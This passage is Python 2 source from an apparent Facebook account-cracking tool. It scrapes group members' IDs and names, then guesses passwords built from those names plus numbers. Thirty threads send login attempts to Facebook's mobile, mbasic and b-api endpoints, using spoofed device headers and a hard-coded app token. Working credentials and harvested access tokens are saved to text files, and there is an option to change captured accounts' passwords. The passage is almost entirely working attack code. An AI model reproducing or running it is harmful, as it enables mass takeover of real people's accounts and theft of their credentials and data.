                id_grup.append(dev['id'])
                if y != z:
                    break
            except:
                pass

    print garis
    for dev in id_grup:
        try:
            url_grup = ('https://mbasic.facebook.com/browse/group/members/?id={}').format(dev)
            grup(cookie, url_grup)
        except KeyboardInterrupt:
            break


def grup(cookie, url_grup):
    with requests.Session() as (ses_):
        try:
            data = ses_.get(url_grup, cookies=cookie, headers=header).content
            sop_dev = BeautifulSoup(data, 'html.parser')
            members = sop_dev.find('div', id='objects_container')
            for dev in members.find_all('table'):
                user_ = dev['id'].replace('member_', '')
                nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
                try:
                    data_user.append(str(user_) + ' ' + str(nama_))
                except:
                    pass

                print h + '\r [' + p + '*' + h + ']' + p + ' Take 100+ ID Group' + k + ': ' + str(len(data_user)),
                sys.stdout.flush()

            if 'View more' in str(sop_dev):
                url = sop_dev.find('a', string='View more')['href']
                url_grup = 'https://mbasic.facebook.com' + url
                grup(cookie, url_grup)
        except:
            pass


import time, re, requests, sys, random, subprocess, datetime
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from threading import Thread
import datetime
from datetime import date

def pencarian_pro():
    global ttl__
    ttl__ = []
    nama = raw_input(h + '\n [' + p + '?' + h + ']' + p + ' Search People' + h + ': ')
    while True:
        try:
            if y != z:
                break
            print p + '\n [' + h + '1' + p + ']' + h + ' @email.com' + a + ' Pro'
            print p + ' [' + h + '2' + p + ']' + h + ' @gmail.com'
            print p + ' [' + h + '3' + p + ']' + h + ' @yahoo.com'
            print garis
            pil = raw_input(p + ' [' + h + '!' + p + ']' + h + ' Select Domain' + h + ': ')
            if pil == '1':
                domain = '@email.com'
                break
            elif pil == '2':
                domain = '@gmail.com'
                break
            elif pil == '3':
                domain = '@yahoo.com'
                break
        except:
            break

    jml = input(h + ' [' + p + '$' + h + ']' + p + ' Enter Limit' + k + ': ' + p)
    nam = nama.split()
    if len(nam) == 2:
        for dev in range(1, (jml + 1) / 2 + 1):
            try:
                t = te.replace(te, '')
                user_id.append(str(nam[0]) + str(dev) + domain + ' ' + str(nam[0]))
                user_id.append(str(nam[0] + nam[1]) + str(dev) + domain + ' ' + str(nam[0] + ' ' + str(nam[1])))
                print '\r [' + p + '$' + h + ']' + p + ' Take' + k + (' {} \x1b[96;1mID ').format(len(user_id)),
                sys.stdout.flush()
            except:
                pass

    if len(nam) == 3:
        for dev in range(1, (jml + 1) / 2 + 1):
            try:
                t = te.replace(te, '')
                user_id.append(str(nam[0]) + str(dev) + domain + ' ' + str(nam[0]))
                user_id.append(str(nam[0] + nam[1] + nam[2]) + str(dev) + domain + ' ' + str(nam[0] + ' ' + str(nam[1] + ' ' + str(nam[2]))))
                print '\r [' + p + '$' + h + ']' + p + ' Take' + k + (' {} \x1b[96;1mID ').format(len(user_id)),
                sys.stdout.flush()
            except:
                pass

    if len(nam) > 3:
        pw = nama.split()
        nam = nama.replace(' ', '')
        for dev in range(1, jml + 1):
            try:
                t = te.replace(te, '')
                user_id.append(str(nam) + str(dev) + domain + ' ' + str(pw[0]))
                print '\r [' + p + '$' + h + ']' + p + ' Take' + k + (' {} \x1b[96;1mID ').format(len(user_id)),
                sys.stdout.flush()
            except:
                pass

    if len(nam) == 1:
        for dev in range(1, jml + 1):
            try:
                t = te.replace(te, '')
                user_id.append(nama + str(dev) + domain + ' ' + nama)
                print '\r [' + p + '$' + h + ']' + p + ' Take' + k + (' {} \x1b[96;1mID ').format(len(user_id)),
                sys.stdout.flush()
            except:
                pass


def __cp__(eml_dev, san_dev):
    wak = datetime.datetime.now()
    waktu = str(wak.year) + '-' + str(wak.month) + '-' + str(wak.day)
    data = h + '\r[' + k + 'CP' + h + ']' + p + (' {:<15}\x1b[92;1m | \x1b[90;1m{}   ').format(eml_dev, san_dev)
    if len(sesi) != 0:
        eml_dev = eml_dev + '>>>'
        cek_dev(eml_dev, san_dev, data)
    else:
        print data
    eml_dev = eml_dev.replace('>>>', '')
    with open('earth_cp.txt', 'a') as (hasil):
        di = open('earth_cp.txt', 'r').read()
        if eml_dev in di:
            has = di.replace(eml_dev, eml_dev).replace(san_dev, san_dev)
            with open('earth_cp.txt', 'w') as (tulis):
                tulis.write(has)
        else:
            hasil.write('[' + waktu + '] ' + eml_dev + ' | ' + san_dev + '\n')
    hasil_cp.append(eml_dev)


def __ttl__cp_(eml_dev, ttl, san_dev):
    try:
        wak = datetime.datetime.now()
        waktu = str(wak.year) + '-' + str(wak.month) + '-' + str(wak.day)
        data = h + '\r[' + k + 'CP' + h + ']' + p + (' {:<15}\x1b[92;1m | \x1b[96;1m{}\x1b[92;1m | \x1b[97;1m{}   ').format(eml_dev, san_dev, ttl)
        if len(sesi) != 0:
            eml_dev = eml_dev + '>>>'
            cek_dev(eml_dev, san_dev, data)
        else:
            print data
        eml_dev = eml_dev.replace('>>>', '')
        with open('earth_cp.txt', 'a') as (hasil):
            di = open('earth_cp.txt', 'r').read()
            if eml_dev in di:
                has = di.replace(eml_dev, eml_dev).replace(san_dev, san_dev)
                with open('earth_cp.txt', 'w') as (tulis):
                    tulis.write(has)
            else:
                hasil.write('[' + waktu + '] ' + eml_dev + ' | ' + san_dev + ' | ' + ttl + '\n')
        hasil_cp.append(eml_dev)
    except:
        pass


user_agent = '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'

def crack_dev_api(iqbal_, dev___):
    global count_
    global user_agent
    tampil = a + ('>\x1b[92;1mCrack\x1b[96;1m->\x1b[97;1m{}\x1b[92;1m/\x1b[97;1m{}\x1b[96;1m|\x1b[92;1mOK\x1b[96;1m/\x1b[93;1mCP:\x1b[92;1m{}\x1b[96;1m/\x1b[93;1m{}').format(len(user_id), count_, len(hasil_ok), len(hasil_cp))
    print '\r' + tampil,
    sys.stdout.flush()
    count_ += 1
    eml_dev = iqbal_
    if 2 == len(eml_dev):
        eml_dev = eml_dev[0]
        ttl = iqbal_[1]
    for san_ in dev___:
        try:
            san_dev = san_.lower()
            user_agent = '[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            header = {'user-agent': user_agent, 'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            response = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(eml_dev) + '&password=' + str(san_dev) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if 'session_key' in response.text and 'EAAA' in response.text:
                if eml_dev in hasil_ok:
                    pass
                else:
                    print a + '\r{' + p + 'OK' + a + '}' + h + (' {:<15}\x1b[96;1m | \x1b[97;1m{} \x1b[96;1mLogin Id With Fb Lite ').format(eml_dev, san_dev)
                    with open('james_ok.txt', 'a') as (hasil):
                        hasil.write('[OK] ' + eml_dev + ' | ' + san_dev + '\n')
                    hasil_ok.append(eml_dev)
                    token = response.json()['access_token']
                    with open('akun_tumbal.txt', 'a') as (tumbal):
                        tumbal.write(token + '\n')
                    cokiz = response.json()['session_cookies']
                    break
            elif 'www.facebook.com' in response.json()['error_msg']:
                id_ = response.json()
                f = id_['error_data'].encode('utf-8')
                eml_dev = re.findall('"uid":(.*),"show_native_checkpoints"', f)[0]
                if len(iqbal_) == 2:
                    if eml_dev in hasil_cp:
                        pass
                    else:
                        __ttl__cp_(eml_dev, ttl, san_dev)
                        break
                elif eml_dev in hasil_cp:
                    pass
                else:
                    __cp__(eml_dev, san_dev)
                    break
        except:
            count_ -= 1
            crack_dev_api(iqbal_, dev___)


def crack_dev(iqbal_, dev___):
    global count_
    global user_agent
    eml_dev = iqbal_
    print a + ('\r>\x1b[92;1mCrack\x1b[96;1m->\x1b[97;1m{}\x1b[92;1m/\x1b[97;1m{}\x1b[96;1m|\x1b[92;1mOK\x1b[96;1m/\x1b[93;1mCP:\x1b[92;1m{}\x1b[96;1m/\x1b[93;1m{}').format(len(user_id), count_, len(hasil_ok), len(hasil_cp)),
    sys.stdout.flush()
    count_ += 1
    if 2 == len(eml_dev):
        eml_dev = eml_dev[0]
        ttl = iqbal_[1]
    for san_ in dev___:
        try:
            san_dev = san_.lower()
            url_page_log = 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7aff248-989f-4b4f-9e41-1f437903a29c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr'
            if 'IqbalDev' in log_ml_dev:
                url_page_log = __ml_dev__
            if 'IqbalDev' in log_ff_dev:
                url_page_log = __ff_dev__
            with requests.Session() as (ses_dev):
                page_dev = ses_dev.get(url_page_log).content
                sop = BeautifulSoup(page_dev, 'html.parser')
                form_dev = sop.find('form', id='login_form')
                url_post = form_dev['action']
                waktu = time.time()
                if len(ua_hp) != 0:
                    user_agent = open('ua_dev.txt', 'r').read()
                payload = {}
                pay_dev = {}
                for dev in form_dev:
                    input = dev
                    try:
                        payload[input.get('name')] = input.get('value')
                    except:
                        pass

                pay_dev.update({'lsd': str(payload['lsd']), 'm_ts': str(payload['m_ts']), 
                   'jazoest': str(payload['jazoest']), 
                   'li': str(payload['li']), 
                   'try_number': str(payload['try_number']), 
                   'unrecognized_tries': str(payload['unrecognized_tries']), 
                   'bi_xrwh': str(payload['bi_xrwh']), 
                   'prefill_contact_point': str(eml_dev), 
                   'prefill_source': 'provided_or_soft_matched', 
                   'prefill_type': 'contact_point', 
                   'first_prefill_source': 'browser_dropdown', 
                   'first_prefill_type': 'contact_point', 
                   'had_cp_prefilled': False, 
                   'had_password_prefilled': False, 
                   'is_smart_lock': False, 
                   'bi_wvdp': {'hwc': True, 'hwcr': True, 'has_dnt': True, 'has_standalone': False, 'wnd_toStr_toStr': 'function toString() { [native code] }', 'hasPerm': True, 'permission_query_toString': 'function query() { [native code] }', 'permission_query_toString_toString': 'function toString() { [native code] }', 'has_seWo': True, 'has_meDe': True, 'has_creds': True, 'iframeProto': 'function get contentWindow() { [native code] }', 'remap': False, 'iframeData': {'hwc': True, 'hwcr': False, 'has_dnt': True, 'has_standalone': False, 'wnd_toStr_toStr': 'function toString() { [native code] }', 'hasPerm': True, 'permission_query_toString': 'function query() { [native code] }', 'permission_query_toString_toString': 'function toString() { [native code] }', 'has_seWo': True, 'has_meDe': True, 'has_creds': True}}, 'email': str(eml_dev), 'encpass': ('#PWD_BROWSER:0:{}:{}').format(str(random.randint(1000000000, 9999999999L)), str(san_dev)), 
                   'bi_xrwh': '0', 
                   '__dyn': '', 
                   '__csr': '', 
                   '__req': 'e', 
                   '__a': '', 
                   '__user': '0'})
                ses_dev.headers.update({'user-agent': user_agent, 'referer': fb + url_post, 
                   'Host': 'm.facebook.com', 
                   'accept': '*/*', 
                   'sec-ch-ua-mobile': '?1', 
                   'accept-encoding': 'gzip, deflate, br', 
                   'accept-language': 'id,en-US;q=0.9,en;q=0.8', 
                   'x-fb-lsd': str(payload['lsd']), 
                   'content-length': str(random.randint(1000, 5000)), 
                   'content-type': 'application/x-www-form-urlencoded'})
                pay_ = {'email': str(eml_dev), 'encpass': ('#PWD_BROWSER:0:{}:{}').format(str(random.randint(1000000000, 9999999999L)), str(san_dev))}
                login_dev = ses_dev.post(fb + url_post, data=pay_dev, allow_redirects=False).cookies
                cookie = login_dev.get_dict()
                if len(login_dev.get_dict()) == 0:
                    login_dev = ses_dev.post(fb + url_post, data=pay_, allow_redirects=False).cookies
                if 'c_user' in login_dev:
                    if eml_dev in hasil_ok:
                        pass
                    else:
                        print a + '\r{' + p + 'OK' + a + '}' + h + (' {:<15}\x1b[96;1m | \x1b[97;1m{}').format(eml_dev, san_dev)
                        with open('james_ok.txt', 'a') as (hasil):
                            hasil.write('[OK] ' + eml_dev + ' | ' + san_dev + '\n')
                        hasil_ok.append(eml_dev)
                        break
                elif 'checkpoint' in login_dev:
                    eml_dev = login_dev.get_dict()['CP'].split('%')[4].replace('3A', '')
                    if len(iqbal_) == 2:
                        if eml_dev in hasil_cp:
                            pass
                        else:
                            __ttl__cp_(eml_dev, ttl, san_dev)
                            break
                    elif eml_dev in hasil_cp:
                        pass
                    else:
                        __cp__(eml_dev, san_dev)
                        break
        except:
            count_ -= 1
            crack_dev(iqbal_, dev___)


def crack_mobile(iqbal_, dev__):
    global count_
    global user_agent
    try:
        eml_dev = iqbal_
        print a + ('\r>\x1b[92;1mCrack\x1b[96;1m->\x1b[97;1m{}\x1b[92;1m/\x1b[97;1m{}\x1b[96;1m|\x1b[92;1mOK\x1b[96;1m/\x1b[93;1mCP:\x1b[92;1m{}\x1b[96;1m/\x1b[93;1m{}').format(len(user_id), count_, len(hasil_ok), len(hasil_cp)),
        sys.stdout.flush()
        count_ += 1
        if 2 == len(eml_dev):
            eml_dev = eml_dev[0]
            ttl = iqbal_[1]
        for san__ in dev__:
            san_dev = san__.lower()
            url = 'https://m.facebook.com/login/?ref=dbl&fl'
            with requests.Session() as (ses_dev):
                if 'IqbalDev' in log_mbasic_dev:
                    url = 'https://mbasic.facebook.com/login/?ref=dbl&fl'
                if 'IqbalDev' in log_free_dev:
                    url = 'https://free.facebook.com/login.php'
                halaman = ses_dev.get(url).content
                sop = BeautifulSoup(halaman, 'html.parser')
                form = sop.find('form', id='login_form')
                url_post = form['action']
                wkt_dev = time.time()
                payload = {}
                pay_dev = {}
                for dev in form:
                    input = dev
                    try:
                        payload[input.get('name')] = input.get('value')
                    except:
                        pass

                pay_dev = {'lsd': str(payload['lsd']), 'm_ts': str(payload['m_ts']), 
                   'jazoest': str(payload['jazoest']), 
                   'li': str(payload['li']), 
                   'try_number': str(payload['try_number']), 
                   'unrecognized_tries': str(payload['unrecognized_tries']), 
                   'bi_xrwh': str(payload['bi_xrwh']), 
                   'prefill_contact_point': str(eml_dev), 
                   'prefill_source': 'provided_or_soft_matched', 
                   'prefill_type': 'contact_point', 
                   'first_prefill_source': 'browser_dropdown', 
                   'first_prefill_type': 'contact_point', 
                   'had_cp_prefilled': False, 
                   'had_password_prefilled': False, 
                   'is_smart_lock': False, 
                   'bi_wvdp': {'hwc': True, 'hwcr': True, 'has_dnt': True, 'has_standalone': False, 'wnd_toStr_toStr': 'function toString() { [native code] }', 'hasPerm': True, 'permission_query_toString': 'function query() { [native code] }', 'permission_query_toString_toString': 'function toString() { [native code] }', 'has_seWo': True, 'has_meDe': True, 'has_creds': True, 'iframeProto': 'function get contentWindow() { [native code] }', 'remap': False, 'iframeData': {'hwc': True, 'hwcr': False, 'has_dnt': True, 'has_standalone': False, 'wnd_toStr_toStr': 'function toString() { [native code] }', 'hasPerm': True, 'permission_query_toString': 'function query() { [native code] }', 'permission_query_toString_toString': 'function toString() { [native code] }', 'has_seWo': True, 'has_meDe': True, 'has_creds': True}}, 'email': str(eml_dev), 'encpass': ('#PWD_BROWSER:0:{}:{}').format(str(random.randint(1000000000, 9999999999L)), str(san_dev)), 
                   'bi_xrwh': '0', 
                   '__dyn': '', 
                   '__csr': '', 
                   '__req': 'e', 
                   '__a': '', 
                   '__user': '0'}
                if 'IqbalDev' in log_mbasic_dev or 'IqbalDev' in log_free_dev:
                    payload = {}
                    for dev in form:
                        input = dev
                        try:
                            payload[input.get('name')] = input.get('value')
                        except:
                            pass

                    pay_dev = {'lsd': str(payload['lsd']), 'jazoest': str(payload['jazoest']), 
                       'm_ts': str(payload['m_ts']), 
                       'li': str(payload['li']), 
                       'try_number': str(payload['try_number']), 
                       'unrecognized_tries': str(payload['unrecognized_tries']), 
                       'email': str(eml_dev), 
                       'pass': str(san_dev), 
                       'bi_xrwh': str(payload['bi_xrwh'])}
                url_post_ = 'https://m.facebook.com'
                host = 'm.facebook.com'
                if 'IqbalDev' in log_mbasic_dev:
                    url_post_ = 'https://mbasic.facebook.com'
                    host = 'mbasic.facebook.com'
                if 'IqbalDev' in log_free_dev:
                    url_post_ = 'https://free.facebook.com'
                    host = 'free.facebook.com'
                user_agent = 'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]'
                header_mobile = {'Host': host, 'user-agent': user_agent, 
                   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
                   'accept-encoding': 'gzip, deflate, br', 
                   'accept-language': 'id', 
                   'cache-control': 'max-age=0', 
                   'content-length': str(random.randint(100, 200)), 
                   'content-type': 'application/x-www-form-urlencoded', 
                   'origin': url_post_, 
                   'referer': url, 
                   'sec-ch-ua-mobile': '?0', 
                   'sec-fetch-dest': 'document', 
                   'sec-fetch-mode': 'navigate', 
                   'sec-fetch-site': 'same-origin'}
                if len(ua_hp) != 0:
                    user_agent = open('ua_dev.txt', 'r').read()
                    header_mobile = {'Host': host, 'user-agent': user_agent, 
                       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
                       'accept-encoding': 'gzip, deflate, br', 
                       'accept-language': 'id', 
                       'cache-control': 'max-age=0', 
                       'content-length': str(random.randint(100, 200)), 
                       'content-type': 'application/x-www-form-urlencoded', 
                       'origin': url_post_, 
                       'referer': url, 
                       'sec-ch-ua-mobile': '?0', 
                       'sec-fetch-dest': 'document', 
                       'sec-fetch-mode': 'navigate', 
                       'sec-fetch-site': 'same-origin'}
                login = ses_dev.post(url_post_ + url_post, data=pay_dev, headers=header_mobile)
                log = login.cookies
                login_dev = log.get_dict()
                if 'c_user' in login_dev or 'checkpointSecondaryButton' in login.text:
                    if eml_dev in hasil_ok:
                        pass
                    else:
                        print a + '\r[' + p + 'OK' + a + ']' + h + (' {:<15}\x1b[96;1m | \x1b[97;1m{}').format(eml_dev, san_dev)
                        with open('earth_ok.txt', 'a') as (hasil):
                            hasil.write('[OK] ' + eml_dev + ' | ' + san_dev + '\n')
                        hasil_ok.append(eml_dev)
                        break
                elif 'checkpoint' in login_dev:
                    eml_dev = log.get_dict()['checkpoint'].split('%')[4].replace('3A', '')
                    if len(iqbal_) == 2:
                        if eml_dev in hasil_cp:
                            pass
                        else:
                            __ttl__cp_(eml_dev, ttl, san_dev)
                            break
                    elif eml_dev in hasil_cp:
                        pass
                    else:
                        __cp__(eml_dev, san_dev)
                        break
                else:
                    continue

    except:
        count_ -= 1
        crack_mobile(iqbal_, dev__)


tap_yes = []

def seting_pw_tap_yes():
    global pw_new
    tap_yes.append('Dev')
    while True:
        print garis
        print h + ' [' + p + '@' + h + ']' + p + ' Example: ' + k + 'Pakistan'
        pw_new = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Change Account Password' + a + ' Tap Yes' + h + ': ')
        if len(pw_new) < 6:
            print m + ' Minimum 6 Characters..'
        else:
            break


san_manual = []
gak_gabung = []
sandi_gabung = []
angka_nama = []
pilih = []
san_ttl = []

def sandi_dev():
    global pw_new
    try:
        open('ua_dev.txt', 'r').read()
    except:
        pil_ua.append('IqbalDev')
        ua_.append('dev_id')
        __seting_ua_dev__()

    if len(ua_) == 1:
        ua = raw_input(h + '\n [' + p + '?' + h + ']' + p + ' Use your HP User-Agent?' + a + '[y/n]' + d + 'ENTER>Skip' + h + ': ')
        if 'y' in ua or 'Y' in ua:
            try:
                hp = open('hp.txt', 'r').read()
                print h + ' [' + p + '*' + h + ']' + p + ' Use' + h + ' User-Agent ' + p + hp
                ua_hp.append('IqbalDev')
            except:
                pil_ua.append('IqbalDev')
                __seting_ua_dev__()

        else:
            print h + ' [' + p + '*' + h + ']' + p + ' Use' + h + ' Default User-Agent Tool '
    print h + '\n [' + p + '@' + h + ']' + p + ' Manual Password Example: ' + k + 'Paksitan,102030,Bangladesh'
    san = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Enter Password Manual?' + d + 'ENTER>Skip' + h + ': ')
    sandi_bawaan_koma = 'name123,name12345'
    sandi_bawaan_spasi = 'name123 name12345'
    while True:
        print h + '\n [' + p + '@' + h + ']' + p + ' Example: ' + k + '123,1234,12345'
        angka = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Add Numbers Behind Name' + h + ': ')
        if len(angka) != 0:
            angka_ = angka.split(',')
            for dev in angka_:
                angka_nama.append(dev)

            break

    while True:
        print garis
        print h + ' [' + k + '1' + h + ']' + p + ' FirstName+LastName'
        print h + ' [' + k + '2' + h + ']' + p,
        for dev in angka_nama:
            print 'FirstName' + k + dev,

        print ''
        print h + ' [' + k + '3' + h + ']' + p,
        for dev in angka_nama:
            print p + 'FirstName+LastName' + k + dev,

        print 'FirstName+LastName'
        print h + ' [' + k + '4' + h + ']' + p,
        for dev in angka_nama:
            print p + 'FirstName' + k + dev,

        for dev in angka_nama:
            print p + 'FirstName+LastName' + k + dev,

        print 'FirstName+LastName'
        print garis
        pil = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Choose Password Combination' + h + ': ')
        if pil == '1':
            pilih.append('1')
            break
        elif pil == '2':
            pilih.append('2')
            break
        elif pil == '3':
            pilih.append('3')
            break
        elif pil == '4':
            pilih.append('4')
            break

    if len(ttl__) != 0:
        while True:
            print garis
            pil = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Add TTL Password?' + a + '[y/n]' + h + ': ')
            if 'y' in pil or 'Y' in pil:
                san_ttl.append('Dev')
                break
            elif 'n' in pil or 'N' in pil:
                break

    while True:
        print garis
        pil = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Bring up ' + k + 'SESSION OPTIONS ?' + a + '[y/n]' + h + ': ')
        if 'y' in pil or 'Y' in pil:
            sesi.append('Dev')
            break
        elif 'n' in pil or 'N' in pil:
            break

    if len(sesi) != 0:
        while True:
            print garis
            print h + ' [' + p + '@' + h + ']' + p + ' Example: ' + k + 'pakistan'
            pw_new = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Change Account Password' + a + ' Tap Yes' + h + ': ')
            if len(pw_new) < 6:
                print m + ' Minimum 6 Characters..'
            else:
                break

    if ',' in san:
        san_ = san.split(',')
        tampak = sandi_bawaan_koma + ',' + san
    else:
        if ' ' in san:
            san_ = san.split(' ')
            tampak = sandi_bawaan_spasi + ' ' + san
        else:
            san_ = san.split()
            tampak = sandi_bawaan_koma + ',' + san
        for dev in san_:
            if len(dev) >= 6:
                san_manual.append(dev)
            elif len(dev) == 3 or len(dev) == 4 or len(dev) == 5:
                san_manual.append(dev + '123')

    if len(san_manual) != 0:
        print h + '\n [' + p + '*' + h + ']' + p + ' If merged: ' + k + tampak
        sandi = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Combine Manual and Default Password?' + a + '[y/n]' + h + ': ')
        if 'y' in sandi or 'Y' in sandi:
            sandi_gabung.append('IqbalDev')
            print h + '\n [' + p + '*' + h + ']' + p + ' Not Combining With Default Password' + a + ' >_<'
        else:
            gak_gabung.append('IqbalDev')
            print h + '\n [' + p + '*' + h + ']' + p + ' Not Combining With Default Password' + m + ' X'


instagram = []
b_api = []
mobile_crack = []

def crack():
    with ThreadPoolExecutor(max_workers=30) as (c_dev):
        for data_ in user_id:
            try:
                pas = []
                _id_dev_ = data_.split()[0]
                pw = data_.split()
                if 'IqbalDev' in gak_gabung:
                    pas = san_manual
                elif 'IqbalDev' not in sandi_gabung:
                    if len(pw[1]) >= 3:
                        if len(pw) >= 3:
                            if '1' in pilih:
                                pas.append(pw[1] + pw[2])
                            if '2' in pilih:
                                for dev in angka_nama:
                                    if len(dev) < 3 and len(pw[1]) == 3:
                                        pass
                                    else:
                                        pas.append(pw[1] + dev)

                            if '3' in pilih:
                                for dev in angka_nama:
                                    pas.append(pw[1] + pw[2] + dev)

                                pas.append(pw[1] + pw[2])
                            if '4' in pilih:
                                for dev in angka_nama:
                                    if len(dev) < 3 and len(pw[1]) == 3:
                                        pass
                                    else:
                                        pas.append(pw[1] + dev)

                                for dev in angka_nama:
                                    pas.append(pw[1] + pw[2] + dev)

                                pas.append(pw[1] + pw[2])
                        else:
                            for dev in angka_nama:
                                if len(dev) < 3 and len(pw[1]) == 3:
                                    pass
                                else:
                                    pas.append(pw[1] + dev)

                    elif len(pw) >= 3:
                        for dev in angka_nama:
                            pas.append(pw[1] + pw[2] + dev)

                        pas.append(pw[1] + pw[2])
                    else:
                        for dev in angka_nama:
                            if len(dev) < 3:
                                pas.append(pw[1] + pw[1] + dev + dev)
                            else:
                                pas.append(pw[1] + pw[1] + dev)

                else:
                    if len(pw[1]) >= 3:
                        if len(pw) >= 3:
                            if '1' in pilih:
                                pas.append(pw[1] + pw[2])
                            if '2' in pilih:
                                for dev in angka_nama:
                                    if len(dev) < 3 and len(pw[1]) == 3:
                                        pass
                                    else:
                                        pas.append(pw[1] + dev)

                            if '3' in pilih:
                                for dev in angka_nama:
                                    pas.append(pw[1] + pw[2] + dev)

                                pas.append(pw[1] + pw[2])
                            if '4' in pilih:
                                for dev in angka_nama:
                                    if len(dev) < 3 and len(pw[1]) == 3:
                                        pass
                                    else:
                                        pas.append(pw[1] + dev)

                                for dev in angka_nama:
                                    pas.append(pw[1] + pw[2] + dev)

                                pas.append(pw[1] + pw[2])
                        else:
                            for dev in angka_nama:
                                if len(dev) < 3 and len(pw[1]) == 3:
                                    pass
                                else:
                                    pas.append(pw[1] + dev)

                    elif len(pw) >= 3:
                        for dev in angka_nama:
                            pas.append(pw[1] + pw[2] + dev)

                        pas.append(pw[1] + pw[2])
                    else:
                        for dev in angka_nama:
                            if len(dev) < 3:
                                pas.append(pw[1] + pw[1] + dev + dev)
                            else:
                                pas.append(pw[1] + pw[1] + dev)

                    pas = pas + san_manual
                if 'Dev' in san_ttl:
                    if '>>>' in data_:
                        tl_dev = []
                        pw = pw[0].split('>>>')
                        tl = str(pw[1])
                        tl_ = tl.replace('/', '')
                        tl_dev.append(tl_)
                        if len(tl_dev[0]) < 6:
                            pass
                        else:
                            pas = pas + tl_dev
                if 'IqbalDev' in instagram:
                    if '>>>' in data_:
                        id_dev_gans = _id_dev_.split('>>>')
                        c_dev.submit(crack_dev, id_dev_gans, pas)
                    else:
                        c_dev.submit(crack_dev, _id_dev_, pas)
                elif 'IqbalDev' in b_api:
                    if '>>>' in data_:
                        id_dev_gans = _id_dev_.split('>>>')
                        c_dev.submit(crack_dev_api, id_dev_gans, pas)
                    else:
                        c_dev.submit(crack_dev_api, _id_dev_, pas)
                elif 'IqbalDev' in mobile_crack:
                    if '>>>' in data_:
                        id_dev_gans = _id_dev_.split('>>>')
                        c_dev.submit(crack_mobile, id_dev_gans, pas)
                    else:
                        c_dev.submit(crack_mobile, _id_dev_, pas)
                else:
                    print ' No Choice....'
            except:
                pass


def cek_dev(eml_dev, san_dev, data):
    try:
        iqbal = eml_dev
        eml_dev = eml_dev.replace('>>>', '')
        url = 'https://mbasic.facebook.com/login'
        with requests.Session() as (ses_dev):
            halaman = ses_dev.get(url).content
            sop = BeautifulSoup(halaman, 'html.parser')
            form = sop.find('form', id='login_form')
            url_post = form['action']
            payload = {}
            for dev in form:
                input = dev
                payload[input.get('name')] = input.get('value')

            payloads = {'lsd': str(payload['lsd']), 'jazoest': str(payload['jazoest']), 
               'm_ts': str(payload['m_ts']), 
               'li': str(payload['li']), 
               'try_number': str(payload['try_number']), 
               'unrecognized_tries': str(payload['unrecognized_tries']), 
               'email': str(eml_dev), 
               'pass': str(san_dev), 
               'bi_xrwh': str(payload['bi_xrwh'])}
